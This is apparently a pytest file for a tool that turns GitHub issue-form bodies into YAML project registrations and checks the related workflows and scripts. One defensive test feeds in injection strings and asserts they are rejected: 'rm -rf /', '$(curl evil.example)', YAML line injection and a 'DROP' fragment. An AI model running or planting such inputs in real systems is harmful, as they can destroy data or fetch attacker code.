"""Tests for turning a GitHub issue-form body into a registration, and for the forms and workflows around it."""

import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

from dbxops.registry.cli import main
from dbxops.registry.intake import (
    FIELDS,
    NO_RESPONSE,
    REQUIRED_FIELDS,
    IntakeError,
    intake,
    parse_issue_form,
    registration_from_form,
)
from dbxops.registry.registration import validate_registry
from tests.consts import PROJECT_DIR

SCAFFOLD = PROJECT_DIR / "templates/registry-repo"
ANSWERS = {
    "Project id": "intake_probe",
    "Repository kind": "project",
    "Squad name": "intake_probe_squad",
    "Squad title": "Claims Fraud Squad",
    "GitHub team": "intake-probe",
    "Data domain": "claims__fraud_investigations__fraud_investigation",
    "Technical owner email": "tech@example.com",
    "Data owner email": "data@example.com",
    "Executive owner email": "exec@example.com",
    "Data steward email": "steward@example.com",
    "Support email": "support@example.com",
    "Support channel": "https://teams.example.com/intake-probe",
    "Service principal application id": "",
    "Tags": "cost_center: 12345\nregion: au-east",
    "Repository name": "",
}


def render(answers: dict[str, str]) -> str:
    """Render answers the way GitHub renders an issue form body."""
    return "\n\n".join(f"### {label}\n\n{value or NO_RESPONSE}" for label, value in answers.items())


@pytest.fixture
def registry(tmp_path: Path) -> Path:
    """Return a writable copy of the registry scaffold."""
    root = tmp_path / "registry"
    shutil.copytree(SCAFFOLD, root)
    return root


def test__the_issue_forms_ask_exactly_the_questions_the_parser_reads():
    """Both forms have one field per parser label, in the same order, required exactly where the parser requires."""
    for name in ("onboard-project", "change-project"):
        form = yaml.safe_load((SCAFFOLD / f".github/ISSUE_TEMPLATE/{name}.yml").read_text(encoding="utf-8"))
        fields = [item for item in form["body"] if item["type"] != "markdown"]
        assert [f["attributes"]["label"] for f in fields] == list(FIELDS), name
        assert {f["attributes"]["label"] for f in fields if f["validations"]["required"]} == set(REQUIRED_FIELDS), name
        assert form["labels"] == [name]
        assert next(f for f in fields if f["id"] == "kind")["attributes"]["options"] == ["domain", "project"]


def test__a_rendered_issue_body_parses_back_to_its_answers_and_empty_means_blank():
    """Sections are split by heading; `_No response_` becomes the empty string."""
    parsed = parse_issue_form(render(ANSWERS))
    assert parsed == ANSWERS
    assert not parse_issue_form("no headings here")


def test__a_valid_request_becomes_a_registration_with_derived_groups_and_defaults(registry: Path):
    """AD groups follow the naming rule, the repo name defaults, and a missing service principal is a placeholder."""
    path = intake(render(ANSWERS), registry)
    doc = yaml.safe_load(path.read_text(encoding="utf-8"))
    assert path == registry / "projects/intake_probe.yaml"
    assert doc["groups"] == {
        "developers": "AAD-DBX-INTAKEPROBE-DEV",
        "readers": "AAD-DBX-INTAKEPROBE-READ",
        "admins": "AAD-DBX-INTAKEPROBE-ADMIN",
    }
    assert doc["repo"] == {"name": "dbx-intake-probe"}
    assert doc["service_principal"]["application_id"] == "PLACEHOLDER-project-sp-application-id"
    assert doc["tags"] == {"cost_center": "12345", "region": "au-east"}
    assert validate_registry(registry) == []


def test__problems_are_all_listed_together_and_nothing_is_written(registry: Path):
    """A missing field, a bad email, a misspelt domain and a missing tag are reported in one go; no file results."""
    answers = {
        **ANSWERS,
        "Squad name": "",
        "Data owner email": "not-an-email",
        "Data domain": "claims__fraud_investigatons__fraud_investigation",
        "Tags": "cost_center: 1",
    }
    with pytest.raises(IntakeError) as error:
        intake(render(answers), registry)
    message = str(error.value)
    assert "Squad name: required" in message
    assert not (registry / "projects/intake_probe.yaml").exists()
    answers["Squad name"] = "intake_probe_squad"
    with pytest.raises(IntakeError) as error:
        intake(render(answers), registry)
    assert "contacts/data_owner" in str(error.value)
    assert "did you mean: claims__fraud_investigations__fraud_investigation" in str(error.value)
    assert "missing required tag(s): region" in str(error.value)


@pytest.mark.parametrize(
    "field, value",
    [
        ("Project id", "x'; rm -rf / #"),
        ("Project id", "$(curl evil.example)"),
        ("GitHub team", "a b; c"),
        ("Repository name", "dbx-ok\nextra: injected"),
        ("Support email", 'a@b.c"; DROP'),
    ],
)
def test__hostile_text_in_an_answer_is_rejected_as_data(registry: Path, field: str, value: str):
    """Shell metacharacters or injected YAML in any answer fail validation; nothing is written."""
    with pytest.raises(IntakeError):
        intake(render({**ANSWERS, field: value}), registry)
    assert sorted(p.name for p in (registry / "projects").iterdir()) == ["example_claims.yaml"]


def test__tags_must_be_key_value_lines():
    """A malformed tag line is a problem naming the line; blank lines are ignored."""
    _, problems = registration_from_form({**ANSWERS, "Tags": "cost_center: 1\n\nbroken line\nREGION: x"})
    assert problems == [
        "Tags: 'broken line' is not 'key: value' with a lowercase key",
        "Tags: 'REGION: x' is not 'key: value' with a lowercase key",
    ]


def test__onboarding_refuses_an_existing_project_and_change_refuses_a_new_one(registry: Path):
    """Onboard needs a new project id; change needs an existing one, and change replaces the registration."""
    intake(render(ANSWERS), registry)
    with pytest.raises(IntakeError, match="already registered"):
        intake(render(ANSWERS), registry)
    changed = {**ANSWERS, "Support email": "new-support@example.com"}
    path = intake(render(changed), registry, mode="change")
    assert yaml.safe_load(path.read_text())["contacts"]["support"]["email"] == "new-support@example.com"
    with pytest.raises(IntakeError, match="not registered"):
        intake(render({**ANSWERS, "Project id": "other_project"}), registry, mode="change")


def test__cli_intake_writes_the_file_or_explains_why_not(registry: Path, tmp_path: Path, capsys):
    """The command exits 0 and prints the path, or exits 1 with the list of problems for the issue comment."""
    body = tmp_path / "body.md"
    body.write_text(render(ANSWERS), encoding="utf-8")
    assert main(["intake", str(registry), "--body", str(body)]) == 0
    assert "wrote" in capsys.readouterr().out
    assert main(["intake", str(registry), "--body", str(body)]) == 1
    assert "The request cannot be accepted yet:" in capsys.readouterr().out


@pytest.mark.skipif(shutil.which("actionlint") is None, reason="actionlint not installed")
def test__every_github_workflow_passes_actionlint():
    """Platform and registry workflows have no syntax, expression or input errors."""
    files = sorted([*PROJECT_DIR.glob(".github/workflows/*.yml"), *SCAFFOLD.glob(".github/workflows/*.yml")])
    result = subprocess.run(["actionlint", *map(str, files)], capture_output=True, text=True, check=False)
    assert result.returncode == 0, result.stdout


def test__workflows_pass_untrusted_text_through_environment_variables_never_inline():
    """No `${{ github.event.issue.* }}` expression appears inside a `run:` script; it is mapped to env first."""
    for path in SCAFFOLD.glob(".github/workflows/*.yml"):
        for job in yaml.safe_load(path.read_text(encoding="utf-8"))["jobs"].values():
            for step in job["steps"]:
                assert "github.event.issue" not in step.get("run", ""), (path.name, step.get("name"))


@pytest.mark.skipif(shutil.which("shellcheck") is None, reason="shellcheck not installed")
def test__every_repository_shell_script_passes_shellcheck():
    """The staging, upgrade, upstream-check and provisioning scripts have no shellcheck findings."""
    scripts = sorted([*PROJECT_DIR.glob("scripts/*.sh"), *SCAFFOLD.glob("scripts/*.sh")])
    result = subprocess.run(["shellcheck", *map(str, scripts)], capture_output=True, text=True, check=False)
    assert result.returncode == 0, result.stdout
